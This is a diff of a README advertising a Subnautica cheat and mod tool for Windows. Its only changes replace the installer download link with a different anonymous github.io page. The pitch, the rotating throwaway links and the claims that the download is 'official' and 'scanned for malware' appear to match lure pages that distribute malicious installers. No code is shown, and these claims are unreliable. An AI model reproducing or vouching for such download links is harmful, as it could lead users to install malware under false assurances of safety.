@@ -2,7 +2,7 @@
 
 Welcome to the Subnautica Mod Tool Suite 2026, the ultimate enhancement package for Subnautica players on Windows 10 and 11. This comprehensive tool provides a wide range of features, including god mode, infinite health, infinite oxygen, item spawner, save editor, and blueprint unlocker, all designed to elevate your gaming experience to new heights.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside: Key Features
 
@@ -62,7 +62,7 @@ A: The tool is designed with safety in mind and is scanned for malware. However,
 
 To get the Subnautica Mod Tool Suite, download it from the official source:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Important Notes
 
